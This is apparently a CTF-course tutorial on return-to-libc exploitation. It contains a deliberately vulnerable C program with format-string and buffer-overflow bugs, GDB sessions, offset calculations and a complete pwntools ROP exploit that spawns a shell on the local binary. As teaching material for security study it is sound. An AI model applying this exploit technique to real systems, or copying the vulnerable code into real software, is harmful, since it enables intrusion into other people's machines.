<h1 align="center">PWN 302</h1>
  <p align="center">
  Return to Libc
  </p>

### Table of contents

- [Introduction](#introduction)
- [Overwriting the Return Address](#overwriting-the-return-address)
- [Offset Consistency](#offset-consistency)
- [Ret2libc Steps](#ret2libc-steps)
- [Finding Libc Base Address](#finding-libc-base-address)
- [Finding Other Addresses](#finding-other-addresses)
- [Putting It All Together](#putting-it-all-together)
- [Practice](#practice)
- [More Resources](#more-resources)
- [Creators](#creators)

## Introduction

Whenever you execute a C program on Linux, the standard C library, libc, is almost always loaded alongside the program in memory. The return-to-libc attack is a technique where the attacker overwrites `RIP` with the address of a function that is located within the standard C library in order to bypass DEP. This requires the attacker to either know the virtual address where libc was loaded in memory beforehand or to leak the base address using something like a format string vulnerability. Once the attacker knows the base address of the standard C library, the attacker can then calculate the address of the function he/she needs to jump to.

## Overwriting the Return Address

Here is the code for the program that will be exploited today:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv) {
    char buf[100];

    while(strncmp("quit", buf, 4) != 0) {
        fgets(buf, 1000, stdin);
        printf(buf);
    }

    return 0;
}
```

Here is a sample of what the program looks like when executed:
```sh
$ ./vuln
The program simply
The program simply
Prints out
Prints out
Whatever text you give it
Whatever text you give it
Until you say
Until you say
quit
quit

$
```

If the first four characters of the input are equal to "quit," then it is possible to overwrite the return address after 120 bytes have been sent to the program.

```sh
$ python3 -c "import sys; sys.stdout.buffer.write(b'quit' + b'A'*116 + b'BBBBBBBB')"
quitAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
$ gdb vuln
GNU gdb (Debian 10.1-1.4) 10.1
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
78 commands loaded for GDB 10.1 using Python engine 3.9
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from vuln...
(No debugging symbols found in vuln)
gef➤  r
Starting program: /home/nihaal/Desktop/ctf-courses/Pwn/PWN 303/vuln
quitAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
quitAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x00005555555551b1 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0
$rbx   : 0x0
$rcx   : 0xfffffff0
$rdx   : 0x4
$rsp   : 0x00007fffffffdfc8  →  "BBBBBBBB\n"
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x00007fffffffdf50  →  "quitAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rdi   : 0x0000555555556004  →  0x0000000074697571 ("quit"?)
$rip   : 0x00005555555551b1  →  <main+92> ret
$r8    : 0x00005555555596b0  →  "quitAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$r9    : 0x81
$r10   : 0x6e
$r11   : 0x4
$r12   : 0x0000555555555070  →  <_start+0> xor ebp, ebp
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdfc8│+0x0000: "BBBBBBBB\n"         ← $rsp
0x00007fffffffdfd0│+0x0008: 0x00007fffffff000a  →  0x0000000000000000
0x00007fffffffdfd8│+0x0010: 0x0000000100000000
0x00007fffffffdfe0│+0x0018: 0x0000555555555155  →  <main+0> push rbp
0x00007fffffffdfe8│+0x0020: 0x00007ffff7e157cf  →  <init_cacheinfo+287> mov rbp, rax
0x00007fffffffdff0│+0x0028: 0x0000000000000000
0x00007fffffffdff8│+0x0030: 0xda40a1a22c058212
0x00007fffffffe000│+0x0038: 0x0000555555555070  →  <_start+0> xor ebp, ebp
──────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555551a9 <main+84>        jne    0x555555555166 <main+17>
   0x5555555551ab <main+86>        mov    eax, 0x0
   0x5555555551b0 <main+91>        leave
 → 0x5555555551b1 <main+92>        ret
[!] Cannot disassemble from $PC
──────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x5555555551b1 in main (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555551b1 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

## Offset Consistency

One interesting thing to note about ASLR is that while it does modify the locations of certain variables and functions, it usually does not modify the offsets of these variables and functions. For example, suppose that while debugging a running process, we hit a breakpoint and notice that there is some stack variable `x` at location `0x7ffffffff000` and another stack variable `y` at location `0x7ffffffff100`. Assuming ASLR is enabled, if we were to rerun the process a second time and see that `x` is now stored at location `0x7ffffffff510` when we hit the same breakpoint, then we would expect that `y` would be located at `0x7ffffffff610`. In other words, even though the addresses of each variable get modified, `x` and `y` continue to have an offset of exactly `0x100` bytes away from each other in each instance of the program.

The reason that this occurs is because it would take far too long for ASLR to randomize the locations of each and every variable in a program. Instead, ASLR simply randomizes the base addresses of the memory mappings, which causes the distances between two variables in the same memory mapping to rarely change.

Of course, there are exceptions to this rule of rarely changing offsets. If `x` was a heap variable while `y` was a stack variable, then there would be a far greater chance for the offsets to change since the heap and the stack are loaded into two very separate memory mappings. Furthermore, if we were to use two different breakpoints at two different locations of the program, then there would be a greater chance for one of the variables to have been deleted or moved somewhere else due to the constantly changing nature of the stack. However, for the purposes of doing a ret2libc attack, this is a perfect scenario because if we know the address where the libc library is loaded, then we can add the value of an unchanging offset to that address to obtain the address of a function within the libc library.

## Ret2libc Steps

There are four main steps to completing a basic return-to-libc attack:
1. Obtain an address that points to something within the libc library using something like a format string vulnerability (only required if ASLR is enabled).
2. Use the address from step 1 to calculate the base address of the libc library.
3. Calculate the addresses of the libc functions you would like to jump to using the base address of the libc library.
4. Use a different vulnerability, such as a buffer overflow, to overwrite the return address with the libc function that you would like to jump to (can also use ROP chains to jump to multiple libc functions).

## Finding Libc Base Address

Our first step is to use a format string vulnerability to leak an address from the stack that points to a function/variable in the libc library. In order to see the entire memory mapping from a specific running instance of the program, we can run the program in GDB using the `r` command, hit Ctrl-C while the program is running, and make use of the `vmmap` command. Note that these addresses can change if you rerun the program.

```sh
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /home/nihaal/Desktop/ctf-courses/Pwn/PWN 303/vuln
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /home/nihaal/Desktop/ctf-courses/Pwn/PWN 303/vuln
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /home/nihaal/Desktop/ctf-courses/Pwn/PWN 303/vuln
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /home/nihaal/Desktop/ctf-courses/Pwn/PWN 303/vuln
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /home/nihaal/Desktop/ctf-courses/Pwn/PWN 303/vuln
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7def000 0x00007ffff7e14000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7e14000 0x00007ffff7f5f000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7f5f000 0x00007ffff7fa9000 0x0000000000170000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fa9000 0x00007ffff7faa000 0x00000000001ba000 --- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7faa000 0x00007ffff7fad000 0x00000000001ba000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fad000 0x00007ffff7fb0000 0x00000000001bd000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fb0000 0x00007ffff7fb6000 0x0000000000000000 rw- 
0x00007ffff7fcc000 0x00007ffff7fd0000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd0000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7fd3000 0x00007ffff7ff3000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ff3000 0x00007ffff7ffb000 0x0000000000021000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
```

In this instance of the program, the base of libc is at `0x7ffff7def000`, and the end of libc is at `0x00007ffff7fb0000`. If we exploit the format string vulnerability, we can see that the fifth pointer printed out from the stack points to an address that is within the libc library, so it will be the address that we use.

```sh
gef➤  c
Continuing.
%p.%p.%p.%p.%p.%p.
0x5555555592a1.(nil).0x5555555592b3.0x7fffffffdf50.0x7ffff7fadbe0.0x7fffffffe0b8.
```

If we subtract the base of libc from the fifth pointer, we get `0x7ffff7fadbe0 - 0x7ffff7def000 = 0x1bebe0`. In other words, if we subtract an offset of `0x1bebe0` from the value of the fifth pointer, then we can obtain the address of the base of libc. We can use this information to start creating an exploit script with pwntools.

```python
#!/usr/bin/env python3
from pwn import *

# Open up the process
p = process("./vuln", stdin=PTY)

# Leak a libc address
p.sendline("%5$p")
libc_base = int(p.recvline(), 16) - 0x1bebe0
```

## Finding Other Addresses

Our next step is to obtain the address of `system()`, which is located in the libc library. In most Linux systems, libc is stored in a file called `/usr/lib/x86_64-linux-gnu/libc-2.31.so`, so we can use the following command to obtain the offset of `system()` from the base of libc.

```sh
$ readelf -s /usr/lib/x86_64-linux-gnu/libc-2.31.so | grep system
  1430: 0000000000048df0    45 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.2.5
```

The offset is `0x48df0`, meaning that if we add `0x48df0` to the `libc_base` variable we created in the Python script earlier, we should get the address of `system()`.

Since our goal is to call `system("/bin/sh")`, we'll also need to have a pointer to the string `/bin/sh`. Because libc uses this string in its code, this string is also located within the libc library, and we can use GDB to look for it.

```sh
gef➤  find 0x00007ffff7def000,0x00007ffff7fb0000,"/bin/sh"
0x7ffff7f79156
1 pattern found.
gef➤  x/s 0x7ffff7f79156
0x7ffff7f79156: "/bin/sh"
```

Note that the parameters for the above `find` command are the beginning and end of the libc memory mapping for that instance. The command gave us an address of `0x7ffff7f79156`, which has an offset of `0x7ffff7f79156 - 0x7ffff7def000 = 0x18a156`.

We'll also need to have access to a `POP RDI` ROP gadget, which will allow us to store a pointer to the `/bin/sh` string into `RDI`. We can use the command shown below to obtain a `POP RDI` gadget (entire output not shown to save space).

```sh
$ ropper --file /usr/lib/x86_64-linux-gnu/libc-2.31.so --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: /usr/lib/x86_64-linux-gnu/libc-2.31.so

[...]

0x0000000000026796: pop rdi; ret;
0x000000000008f2d4: pop rdi; stc; jmp qword ptr [rsi + 0xf];
```

The gadget at offset `0x26796` seems suitable for our purposes.

The last offset we need to obtain is the address of the `exit()` function, which will allow us to cleanly exit the program once we're done using our shell. We can find this address the same way we found the address of `system()`.

```sh
$ readelf -s /usr/lib/x86_64-linux-gnu/libc-2.31.so | grep exit
   135: 000000000003e600    26 FUNC    GLOBAL DEFAULT   14 exit@@GLIBC_2.2.5
   552: 00000000000cb610    72 FUNC    GLOBAL DEFAULT   14 _exit@@GLIBC_2.2.5
   609: 0000000000130bb0    37 FUNC    GLOBAL DEFAULT   14 svc_exit@@GLIBC_2.2.5
   643: 0000000000138360    23 FUNC    GLOBAL DEFAULT   14 quick_exit@GLIBC_2.10
  2217: 000000000003e620   276 FUNC    WEAK   DEFAULT   14 on_exit@@GLIBC_2.2.5
```

We'll be using the first offset, `0x3e600`, and we'll ignore the other functions.

## Putting It All Together

Using the information we gathered in the previous section, we can generate the following exploit script:
```python
#!/usr/bin/env python3
from pwn import *

# Open up the process
p = process("./vuln", stdin=PTY)

# Leak a libc address
p.sendline("%5$p")
libc_base = int(p.recvline(), 16) - 0x1bebe0

# Calculate other addresses
system = p64(libc_base + 0x48df0)
bin_sh = p64(libc_base + 0x18a156)
pop_rdi = p64(libc_base + 0x26796)
exit = p64(libc_base + 0x3e600)

# Create the payload
payload = b'quit'
payload += b'A'*116
payload += pop_rdi
payload += bin_sh
payload += system
payload += exit

# Trigger the buffer overflow
p.sendline(payload)
p.interactive()
```

First, we use the format string vulnerability to leak an address that allows us to calculate the base of libc. Next, we add various offsets to this base value in order to obtain the addresses that we need to use in our exploit. Once that is done, we generate a ROP chain that does the following:
1. Uses the string `quit` to ensure that the program breaks out of the loop and hits a `RET` instruction at some point.
2. Sends 116 useless bytes of A's to the process in order to get to the return address.
3. Overwrites the return address with the address of the `POP RDI` gadget.
4. Sets the value of `RDI` to the address of `/bin/sh`.
5. Overwrites the return address again with the address of `system()`.
6. Overwrites the return address one last time with the address of `exit()`.

When we run this script, we get a working shell.

```sh
$ ./exploit.py
[+] Starting local process './vuln': pid 2734
[*] Switching to interactive mode
$ ls
exploit.py  README.md  vuln  vuln.c
$ whoami
nihaal
$
```

## Practice

The best way to practice creating ROP chains is to go through the challenges in [ROP Emporium](https://ropemporium.com/). These challenges will help you get better at return-oriented programming, and they'll help you understand how to get though common challenges when dealing with ROP chains. 

## More Resources:
- [NX bit](https://en.wikipedia.org/wiki/NX_bit)
- [Symbol Table & Global Offset Table](https://www.codeproject.com/articles/1032231/what-is-the-symbol-table-and-what-is-the-global-of)
- [ROP Emporium](https://ropemporium.com/)
- [Nightmare's ROP Writeups](https://guyinatuxedo.github.io/rop.html)

## Creators

**Nihaal Prasad**

Enjoy :metal:
